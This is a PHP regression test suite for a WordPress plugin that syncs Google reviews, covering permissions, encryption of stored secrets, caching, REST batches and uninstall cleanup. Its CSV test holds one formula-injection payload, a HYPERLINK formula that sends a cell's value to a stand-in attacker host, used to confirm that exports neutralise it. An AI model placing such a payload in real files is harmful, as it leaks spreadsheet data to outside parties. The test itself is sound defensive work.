<?php
/**
 * Regression tests, run inside WordPress by tests/run.sh with
 * `wp eval-file tests/cases.php --user=admin`. The phase comes from the
 * IFR_PHASE environment variable; some phases need wp-config.php changes
 * that run.sh makes between them.
 *
 * Prints PASS / FAIL lines and exits non-zero if anything failed.
 */

$GLOBALS['ifr_failures'] = 0;

function ifr_check( $condition, $label ) {
	if ( ! $condition ) {
		$GLOBALS['ifr_failures']++;
	}
	echo ( $condition ? 'PASS ' : 'FAIL ' ) . $label . "\n";
}

function ifr_raw() {
	return get_option( 'if_reviews_google' );
}

function ifr_review( $name, $rating, $text, $date, $source = 'google' ) {
	return wp_insert_post(
		wp_slash(
			array(
				'post_type'   => 'if_review',
				'post_status' => 'publish',
				'post_title'  => $name,
				'meta_input'  => array(
					'_if_reviewer_name'      => $name,
					'_if_rating'             => $rating,
					'_if_review_text'        => $text,
					'_if_review_date'        => $date,
					'_if_source'             => $source,
					'_if_display_on_website' => '1',
				),
			)
		)
	);
}

function ifr_page() {
	ob_start();
	if_reviews_google_render_page();
	return ob_get_clean();
}

function ifr_connection( $extra = array() ) {
	if_reviews_google_update(
		array_merge(
			array(
				'client_id'      => 'cid.apps.googleusercontent.com',
				'client_secret'  => 'GOCSPX-test-secret',
				'refresh_token'  => 'rt-1',
				'account'        => 'accounts/111',
				'location'       => 'locations/222',
				'location_title' => 'Test Co Melbourne',
				'key_changed'    => 0,
			),
			$extra
		)
	);
}

$phase = getenv( 'IFR_PHASE' );
echo "== phase: $phase" . ( function_exists( 'if_reviews_crypto_key_source' ) ? ' (key source: ' . if_reviews_crypto_key_source() . ')' : ' (plugin inactive)' ) . "\n";

switch ( $phase ) {

	case 'main':
		/* Permissions: Editors and Administrators only. */
		$users = array();
		foreach ( array( 'editor', 'author', 'contributor' ) as $role ) {
			$users[ $role ] = wp_insert_user( array( 'user_login' => "t_$role", 'user_pass' => wp_generate_password(), 'role' => $role, 'user_email' => "$role@example.test" ) );
		}
		$cap = get_post_type_object( 'if_review' )->cap;
		$any = ifr_review( 'Perm Test', 5, '', '2026-01-01' );
		ifr_check( user_can( $users['editor'], $cap->create_posts ) && user_can( $users['editor'], 'edit_post', $any ), 'editor can add and edit reviews' );
		ifr_check( ! user_can( $users['author'], $cap->create_posts ) && ! user_can( $users['author'], 'edit_post', $any ), 'author cannot add or edit reviews' );
		ifr_check( ! user_can( $users['contributor'], $cap->create_posts ), 'contributor cannot add reviews' );
		wp_delete_post( $any, true );

		/* CSV: a quote after a backslash cannot break out of its cell. */
		$evil = '\\",=HYPERLINK("https://evil.example/?x="&A2,"x"),"';
		$fh   = fopen( 'php://temp', 'w+' );
		fputcsv( $fh, array( 'a', if_reviews_csv_cell( $evil ), 'c' ), ',', '"', '' );
		rewind( $fh );
		$fields = str_getcsv( trim( stream_get_contents( $fh ) ), ',', '"', '' );
		ifr_check( 3 === count( $fields ) && $fields[1] === $evil, 'CSV cell with \\" stays one cell' );
		ifr_check( "' =1+1" === if_reviews_csv_cell( ' =1+1' ), 'CSV formula after leading space is neutralised' );

		/* Backslashes survive saving. */
		$bs = ifr_review( 'Back\\Slash', 4, 'C:\\path', '2026-01-02', 'direct' );
		ifr_check( 'Back\\Slash' === get_post_meta( $bs, '_if_reviewer_name', true ) && 'C:\\path' === get_post_meta( $bs, '_if_review_text', true ), 'backslashes kept' );
		wp_delete_post( $bs, true );

		/* Admin notices are plain text. */
		if_reviews_google_notice( 'error', '<a href="x">link</a>' );
		ob_start();
		if_reviews_google_print_notice();
		ifr_check( false === strpos( ob_get_clean(), '<a href="x">' ), 'notices are escaped' );

		/* Encryption at rest and migration of plain values. */
		update_option( 'if_reviews_google', array( 'client_id' => 'cid.apps.googleusercontent.com', 'client_secret' => 'GOCSPX-plain', 'refresh_token' => 'rt-1', 'access_token' => '', 'account' => 'accounts/111', 'location' => 'locations/222', 'location_title' => 'Test Co Melbourne' ), false );
		if_reviews_google_migrate_encryption();
		$raw = ifr_raw();
		foreach ( if_reviews_google_private_keys() as $k ) {
			if ( '' !== $raw[ $k ] && ! if_reviews_is_encrypted( $raw[ $k ] ) ) {
				ifr_check( false, "private field $k encrypted" );
			}
		}
		ifr_check( false === strpos( serialize( $raw ), 'GOCSPX-plain' ) && false === strpos( serialize( $raw ), 'accounts/111' ), 'no plain secrets or IDs in the database' );
		ifr_check( 'Test Co Melbourne' === $raw['location_title'], 'public location name left readable' );
		ifr_check( 'GOCSPX-plain' === if_reviews_google_get()['client_secret'], 'values decrypt' );
		ifr_check( if_reviews_encrypt( 'x' ) !== if_reviews_encrypt( 'x' ), 'fresh nonce each time' );
		ifr_check( false === if_reviews_decrypt( 'ifr1:' . base64_encode( str_repeat( 'a', 60 ) ) ), 'tampered value rejected' );

		/* Client Secret is never sent back to the page. */
		if_reviews_google_update( array( 'refresh_token' => '', 'location' => '', 'account' => '' ) );
		$page = ifr_page();
		ifr_check( false === strpos( $page, 'GOCSPX-plain' ) && false !== strpos( $page, 'Saved. Leave blank to keep it.' ), 'secret not in page' );
		ifr_check( false !== strpos( $page, 'value="Connect to Google"' ), 'connect offered when keys are in wp-config.php' );

		/* Reconnect button when Google stops accepting the connection. */
		ifr_connection( array( 'needs_reconnect' => 1 ) );
		ifr_check( false !== strpos( ifr_page(), 'value="Reconnect"' ), 'Reconnect button shown' );
		if_reviews_google_update( array( 'needs_reconnect' => 0 ) );

		/* API paths and query values. */
		$bad = if_reviews_google_api_get( 'https://mybusiness.googleapis.com/v4/accounts/111/../x' );
		ifr_check( is_wp_error( $bad ) && 'if_google_bad_url' === $bad->get_error_code(), 'odd API path refused' );
		delete_option( 'ifr_mock_log' );
		if_reviews_google_list_locations();
		ifr_check( (bool) preg_grep( '#readMask=name%2Ctitle%2CstorefrontAddress#', (array) get_option( 'ifr_mock_log' ) ), 'query values encoded' );

		/* Matching: far-dated rating-only candidate, any review linkable by hand. */
		$li    = ifr_review( 'Li Wei', 5, '', '2025-01-20' );
		$aisha = ifr_review( 'Aisha Khan', 5, '', '' );
		update_option( 'ifr_mock_fixture', 1 );
		$reviews = if_reviews_google_fetch_reviews();
		ifr_check( is_array( $reviews ) && 6 === count( $reviews ), 'reviews fetched' );
		$plan = if_reviews_google_build_plan( $reviews );
		ifr_check( isset( $plan['matches']['g-ratingonly'][0] ) && $li === $plan['matches']['g-ratingonly'][0]['post_id'], 'rating-only review offered as a match despite the date gap' );
		set_transient( 'if_reviews_google_plan_' . get_current_user_id(), $plan, 600 );
		ob_start();
		if_reviews_google_render_preview();
		$preview = ob_get_clean();
		ifr_check( false !== strpos( $preview, '#' . $aisha . '"' ) && 1 === substr_count( $preview, '<datalist' ), 'any unlinked review offered for linking, from one shared list' );
		$result = if_reviews_google_apply_plan( $plan, array( 'g-new1' => 'link:' . $aisha, 'g-new2' => 'bogus' ) );
		if_reviews_google_record_result( $result );
		ifr_check( 'g-new1' === get_post_meta( $aisha, '_if_google_review_id', true ), 'manual link applied' );
		ifr_check( 6 === $result['imported'] + $result['linked'] && 0 === $result['skipped'], 'unknown decision falls back to the default (' . wp_json_encode( $result ) . ')' );

		/* Later sync: edit, removal, new review. */
		update_option( 'ifr_mock_fixture', 2 );
		$result = if_reviews_google_run_sync();
		ifr_check( ! is_wp_error( $result ) && 1 === $result['updated'] && 1 === $result['imported'] && 1 === $result['missing'], 'second sync updates, imports and flags (' . wp_json_encode( $result ) . ')' );
		ifr_check( if_reviews_is_encrypted( ifr_raw()['access_token'] ), 'refreshed access token stored encrypted' );

		/* Review cache. */
		delete_transient( 'if_reviews_review_cache' );
		$first = if_reviews_get_reviews();
		ifr_check( false !== get_transient( 'if_reviews_review_cache' ), 'reviews cached after loading' );
		update_post_meta( $li, '_if_rating', 3 );
		ifr_check( false === get_transient( 'if_reviews_review_cache' ), 'cache cleared when a review changes' );
		$again = wp_list_pluck( if_reviews_get_reviews(), 'rating', 'id' );
		ifr_check( 3 === (int) $again[ $li ], 'reloaded reviews show the change' );
		$new = ifr_review( 'Cache New', 5, 'New one', '2026-02-02', 'direct' );
		ifr_check( count( if_reviews_get_reviews() ) === count( $first ) + 1, 'new review appears' );
		wp_trash_post( $new );
		ifr_check( count( if_reviews_get_reviews() ) === count( $first ), 'trashed review disappears' );

		/* Cold cache build: a fixed number of queries, not one per review. */
		for ( $n = 0; $n < 60; $n++ ) {
			$q = ifr_review( "Bulk $n", 4, "Bulk review $n", '2025-05-05', 'direct' );
			wp_set_object_terms( $q, 'bulk', 'if_review_category' );
		}
		if_reviews_delete_review_caches();
		global $wpdb;
		$before = $wpdb->num_queries;
		if_reviews_get_reviews();
		$queries = $wpdb->num_queries - $before;
		ifr_check( $queries < 20, "cold cache build uses few queries ($queries for " . count( if_reviews_get_reviews() ) . ' reviews)' );
		$cached = get_transient( 'if_reviews_review_cache' );
		ifr_check( ! isset( $cached['reviews'][0]['source']['icon'] ), 'cache stores no icons' );

		/* Same-request memo: a second widget does not read the cache again. */
		$before = $wpdb->num_queries;
		if_reviews_get_reviews();
		ifr_check( $wpdb->num_queries === $before, 'second load in a request costs no queries' );

		/* Stale cache: changes after someone else rebuilt the cache are flushed at shutdown. */
		if_reviews_flush_review_cache();
		if_reviews_get_reviews(); // Rebuilt mid-"import".
		update_post_meta( $q, '_if_rating', 2 );
		set_transient( 'if_reviews_review_cache', array( 'key' => if_reviews_cache_key(), 'reviews' => array() ), 600 ); // Another request's stale rebuild.
		do_action( 'shutdown' );
		ifr_check( false === get_transient( 'if_reviews_review_cache' ), 'cache flushed again at the end of a request that changed reviews' );

		/* Batches: only the first batch is in the page. */
		$html  = do_shortcode( '[if_reviews limit="0"]' );
		$cards = substr_count( $html, '<article class="if-review-card' );
		ifr_check( if_reviews_batch_size() === $cards, "limit 0 renders one batch ($cards cards)" );
		ifr_check( false !== strpos( $html, 'data-more-url=' ) && false !== strpos( $html, 'class="if-show-more"' ), 'Show more set up to fetch the rest' );
		$html = do_shortcode( '[if_reviews limit="6"]' );
		ifr_check( 6 === substr_count( $html, '<article class="if-review-card' ) && false === strpos( $html, ' hidden>' ), 'limit 6 renders six cards, none hidden' );
		$html = do_shortcode( '[if_reviews limit="6" show_more="no"]' );
		ifr_check( false === strpos( $html, 'data-more-url=' ), 'no Show more when turned off' );
		$html = do_shortcode( '[if_reviews layout="carousel" limit="0"]' );
		ifr_check( if_reviews_batch_size() === substr_count( $html, '<article class="if-review-card' ) && false !== strpos( $html, 'data-more-url=' ), 'carousel without a limit loads in batches' );

		/* REST batches: complete, no repeats, hidden reviews never returned. */
		$total = count( array_filter( if_reviews_get_reviews(), function ( $r ) { return $r['display']; } ) );
		foreach ( array( 'newest', 'random' ) as $order ) {
			$seen_ids = array();
			$offset   = 0;
			$more     = true;
			$guard    = 0;
			while ( $more && $guard++ < 20 ) {
				$request = new WP_REST_Request( 'GET', '/if-reviews/v1/cards' );
				$request->set_query_params( array( 'order' => $order, 'seed' => 12345, 'offset' => $offset, 'count' => 10 ) );
				$data = rest_do_request( $request )->get_data();
				preg_match_all( '/aria-label="Review by ([^"]+)"/', $data['html'], $m );
				$seen_ids = array_merge( $seen_ids, $m[1] );
				$offset   = $data['offset'];
				$more     = $data['more'];
			}
			$expected = wp_list_pluck( if_reviews_display_list( if_reviews_get_reviews(), $order, 12345, if_reviews_get_options(), 3 ), 'name' );
			$got      = array_map( 'html_entity_decode', $seen_ids );
			sort( $expected );
			sort( $got );
			ifr_check( $got === $expected, "REST batches return every shown review exactly once ($order: " . count( $seen_ids ) . " of $total)" );
		}
		$request = new WP_REST_Request( 'GET', '/if-reviews/v1/cards' );
		$request->set_query_params( array( 'count' => 100 ) );
		$all_html = rest_do_request( $request )->get_data()['html'];
		ifr_check( false === strpos( $all_html, 'Hidden Harriet' ) || ! get_post( $hidden ), 'REST never returns hidden reviews' );

		/* Rating badge from cached totals, as one sentence. */
		delete_transient( 'if_reviews_stats_cache' );
		$badge = do_shortcode( '[if_reviews_rating]' );
		ifr_check( false !== get_transient( 'if_reviews_stats_cache' ), 'badge totals cached' );
		ifr_check( (bool) preg_match( '/<span class="if-rating-value">[\d.]+<\/span> from [\d,]+ reviews/', $badge ), 'badge reads as one sentence' );
		$stats = if_reviews_get_stats( array(), array( 'bulk' ) );
		ifr_check( 60 === $stats['count'], 'stats for a category' );

		/* Preview choices arrive as one JSON field. */
		$parsed = if_reviews_google_parse_decisions( array( 'decisions' => wp_slash( wp_json_encode( array( 'g-1' => 'skip', 'g-2' => 'link:12', 'g-3' => array( 'x' ) ) ) ) ) );
		ifr_check( array( 'g-1' => 'skip', 'g-2' => 'link:12' ) === $parsed, 'decisions JSON parsed, non-text values dropped' );

		/* Location list stored encrypted. */
		if_reviews_google_store_locations( array( array( 'account' => 'accounts/999', 'location' => 'locations/888', 'title' => 'Branch' ) ) );
		$raw_loc = get_transient( 'if_reviews_google_locations_' . get_current_user_id() );
		ifr_check( is_string( $raw_loc ) && false === strpos( $raw_loc, 'accounts/999' ), 'location list encrypted at rest' );
		$loaded = if_reviews_google_load_locations();
		ifr_check( isset( $loaded[0]['location'] ) && 'locations/888' === $loaded[0]['location'], 'location list reads back' );

		/* Settings stored once so later views need no extra query. */
		delete_option( 'if_reviews_options' );
		if_reviews_get_options();
		ifr_check( is_array( get_option( 'if_reviews_options' ) ), 'default settings stored on first use' );

		/* Multibyte helpers. */
		ifr_check( 'ÉLAN' === if_reviews_strtoupper( 'élan' ) && 'élan' === if_reviews_strtolower( 'ÉLAN' ), 'multibyte case helpers' );

		/* Revoke sends the token in the body. */
		if_reviews_google_revoke( 'rt-xyz' );
		$seen = get_option( 'ifr_test_revoked' );
		ifr_check( false === strpos( $seen['url'], 'rt-xyz' ) && 'rt-xyz' === $seen['body']['token'], 'revoke token in body' );

		/* Block editor: Authors only see reviews already shown on the site. */
		$hidden = ifr_review( 'Hidden Harriet', 2, 'Private', '2026-03-03', 'direct' );
		update_post_meta( $hidden, '_if_display_on_website', '0' );
		$editor_list = function ( $user ) {
			wp_set_current_user( $user );
			return wp_json_encode( if_reviews_picker_list() );
		};
		$as_author = $editor_list( $users['author'] );
		$as_editor = $editor_list( $users['editor'] );
		wp_set_current_user( 1 );
		ifr_check( false !== strpos( $as_author, 'Li Wei' ) && false === strpos( $as_author, 'Hidden Harriet' ), 'author editor data has shown reviews only' );
		ifr_check( false !== strpos( $as_editor, 'Hidden Harriet' ), 'editor editor data includes hidden reviews' );

		/* Updates: only from release zips. */
		ifr_check( array( 'latest_release' => 1 ) === if_reviews_release_only_strategies( array( 'latest_release' => 1, 'latest_tag' => 2, 'branch' => 3 ) ), 'update strategies limited to releases' );
		ifr_check( false !== has_filter( 'puc_vcs_update_detection_strategies-if-reviews', 'if_reviews_release_only_strategies' ), 'release-only filter registered' );

		/* Revoke result is reported. */
		ifr_check( true === if_reviews_google_revoke( 'rt-ok' ), 'revoke success reported' );
		$fail = function ( $pre, $args, $url ) { return false !== strpos( $url, '/revoke' ) ? new WP_Error( 'down', 'down' ) : $pre; };
		add_filter( 'pre_http_request', $fail, 20, 3 );
		ifr_check( false === if_reviews_google_revoke( 'rt-fail' ), 'revoke failure reported' );
		remove_filter( 'pre_http_request', $fail, 20 );

		/* Migration runs after an update on any request, once per version. */
		$sealed = ifr_raw();
		update_option( 'if_reviews_google', array( 'client_id' => 'cid.apps.googleusercontent.com', 'client_secret' => 'GOCSPX-old', 'refresh_token' => 'rt-1', 'account' => 'accounts/111', 'location' => 'locations/222', 'location_title' => 'Test Co Melbourne' ), false );
		update_option( 'if_reviews_version', '2.4.2' );
		if_reviews_google_migrate_after_update();
		ifr_check( if_reviews_is_encrypted( ifr_raw()['client_secret'] ) && IF_REVIEWS_VERSION === get_option( 'if_reviews_version' ), 'plain values from an older version encrypted after update' );

		/* Saving a setting keeps values that cannot be re-encrypted right now. */
		$before = ifr_raw();
		add_filter( 'if_reviews_crypto_available', '__return_false' );
		if_reviews_google_update( array( 'auto_sync' => 1 ) );
		$after = ifr_raw();
		ifr_check( $before['client_secret'] === $after['client_secret'] && $before['refresh_token'] === $after['refresh_token'], 'unrelated save keeps stored values while encryption is unavailable' );
		remove_filter( 'if_reviews_crypto_available', '__return_false' );
		ifr_check( 'GOCSPX-old' === if_reviews_google_get()['client_secret'], 'values readable again afterwards' );

		/* Fail closed: without encryption nothing private is stored. */
		add_filter( 'if_reviews_crypto_available', '__return_false' );
		ifr_connection();
		$raw = ifr_raw();
		ifr_check( '' === $raw['client_secret'] && '' === $raw['refresh_token'] && '' === $raw['account'], 'nothing private stored when encryption is unavailable' );
		ifr_check( false !== strpos( ifr_page(), 'this server cannot encrypt data' ), 'cannot-encrypt message shown' );
		remove_filter( 'if_reviews_crypto_available', '__return_false' );

		/* Leave a connection sealed with the wp-config.php keys for the next phase. */
		ifr_connection();
		break;

	case 'dedicated-key':
		// IF_REVIEWS_ENCRYPTION_KEY is now defined: values move to it automatically.
		if_reviews_crypto_used_old_key( false );
		if_reviews_google_migrate_encryption();
		if_reviews_crypto_used_old_key( false );
		$g = if_reviews_google_get();
		ifr_check( 'rt-1' === $g['refresh_token'] && ! $g['key_changed'], 'values readable after adding a dedicated key' );
		ifr_check( ! if_reviews_crypto_used_old_key(), 'values re-encrypted with the dedicated key' );
		break;

	case 'wrong-key':
		// A different dedicated key: nothing can decrypt the values.
		$g = if_reviews_google_get();
		ifr_check( 1 === (int) $g['key_changed'] && '' === $g['refresh_token'], 'unreadable values detected' );
		ifr_check( ! if_reviews_google_is_connected(), 'shows as not connected' );
		ifr_check( false !== strpos( ifr_page(), 'could not be decrypted' ), 'asks for the secret and a reconnect' );
		$before = ifr_raw();
		if_reviews_google_update( array( 'auto_sync' => 1 ) );
		$after = ifr_raw();
		ifr_check( $before['refresh_token'] === $after['refresh_token'] && $before['client_secret'] === $after['client_secret'] && $before['location'] === $after['location'], 'saving a setting does not wipe unreadable values' );
		ifr_check( 0 === (int) $after['key_changed'] && 1 === (int) if_reviews_google_get()['key_changed'], 'key_changed worked out on read, not stored' );
		break;

	case 'key-back':
		// The first dedicated key is back: nothing was lost.
		$g = if_reviews_google_get();
		ifr_check( 'rt-1' === $g['refresh_token'] && 'GOCSPX-test-secret' === $g['client_secret'] && ! $g['key_changed'], 'values readable again when the key returns' );
		ifr_check( if_reviews_google_is_connected(), 'still connected' );
		break;

	case 'constant-credentials':
		if_reviews_google_update( array( 'client_id' => 'typed', 'client_secret' => 'typed', 'refresh_token' => '', 'location' => '', 'account' => '', 'key_changed' => 0 ) );
		$raw = ifr_raw();
		$g   = if_reviews_google_get();
		ifr_check( '' === $raw['client_id'] && '' === $raw['client_secret'], 'wp-config.php credentials not stored' );
		ifr_check( 'CONST-SECRET' === $g['client_secret'], 'wp-config.php credentials used' );
		$page = ifr_page();
		ifr_check( false !== strpos( $page, '(IF_REVIEWS_GOOGLE_CLIENT_SECRET)' ) && false === strpos( $page, 'CONST-SECRET' ), 'form says where the secret is set, without showing it' );
		break;

	case 'database-key':
		// run.sh replaced the wp-config.php keys with the sample placeholder.
		ifr_check( 'database' === if_reviews_crypto_key_source() && ! if_reviews_crypto_secure(), 'key in database detected' );
		ifr_connection( array( 'refresh_token' => '', 'location' => '', 'account' => '' ) );
		$page = ifr_page();
		ifr_check( false !== strpos( $page, 'Connecting is turned off until this site has security keys' ), 'blocking message shown' );
		ifr_check( false === strpos( $page, 'value="Connect to Google"' ), 'Connect not offered' );
		ifr_connection( array( 'needs_reconnect' => 1 ) );
		ifr_check( (bool) preg_match( '/value="Reconnect"[^>]*disabled/', ifr_page() ), 'Reconnect disabled' );
		ifr_connection();
		ifr_check( if_reviews_google_is_connected(), 'existing connection kept' );
		update_option( 'ifr_mock_fixture', 2 );
		$result = if_reviews_google_run_sync();
		ifr_check( ! is_wp_error( $result ), 'existing connection keeps syncing' );
		break;

	case 'keys-restored':
		// Keys are back in wp-config.php: values move off the database key.
		if_reviews_crypto_used_old_key( false );
		if_reviews_google_migrate_encryption();
		if_reviews_crypto_used_old_key( false );
		$g = if_reviews_google_get();
		ifr_check( 'rt-1' === $g['refresh_token'] && ! $g['key_changed'], 'values readable after adding keys, no reconnect needed' );
		ifr_check( ! if_reviews_crypto_used_old_key(), 'values re-encrypted off the database key' );
		ifr_check( if_reviews_crypto_secure() && false !== strpos( ifr_page(), 'Connected' ), 'connected, nothing blocked' );
		break;

	case 'before-uninstall':
		ifr_connection( array( 'refresh_token' => 'rt-uninstall' ) );
		// "Delete all reviews" ticked, with a trashed review and categories around.
		$options                        = get_option( 'if_reviews_options', array() );
		$options['delete_on_uninstall'] = 1;
		update_option( 'if_reviews_options', $options );
		$trashed = ifr_review( 'In The Bin', 3, 'Trashed', '2025-01-01', 'direct' );
		wp_set_object_terms( $trashed, 'binned', 'if_review_category' );
		wp_trash_post( $trashed );
		ifr_check( (bool) get_option( 'if_reviews_options' )['delete_on_uninstall'], 'delete-on-uninstall ticked' );
		set_transient( 'if_reviews_google_plan_9', array( 1 ), 600 );
		set_transient( 'other_plugin_transient', 1, 600 );
		ifr_check( if_reviews_is_encrypted( ifr_raw()['refresh_token'] ), 'token encrypted before uninstall' );
		break;

	case 'after-uninstall':
		$seen = get_option( 'ifr_test_revoked' );
		ifr_check( isset( $seen['body']['token'] ) && 'rt-uninstall' === $seen['body']['token'], 'uninstall decrypts and revokes the token' );
		ifr_check( false === get_option( 'if_reviews_google' ), 'settings removed' );
		ifr_check( false === get_transient( 'if_reviews_google_plan_9' ) && 1 == get_transient( 'other_plugin_transient' ), 'only the plugin\'s temporary data removed' );
		global $wpdb;
		$left_posts = (int) $wpdb->get_var( "SELECT COUNT(*) FROM {$wpdb->posts} WHERE post_type = 'if_review'" );
		$left_terms = (int) $wpdb->get_var( "SELECT COUNT(*) FROM {$wpdb->term_taxonomy} WHERE taxonomy = 'if_review_category'" );
		ifr_check( 0 === $left_posts && 0 === $left_terms, "every review (trash included) and category removed ($left_posts posts, $left_terms terms left)" );
		break;

	default:
		ifr_check( false, "unknown phase '$phase'" );
}

if ( $GLOBALS['ifr_failures'] > 0 ) {
	exit( 1 );
}
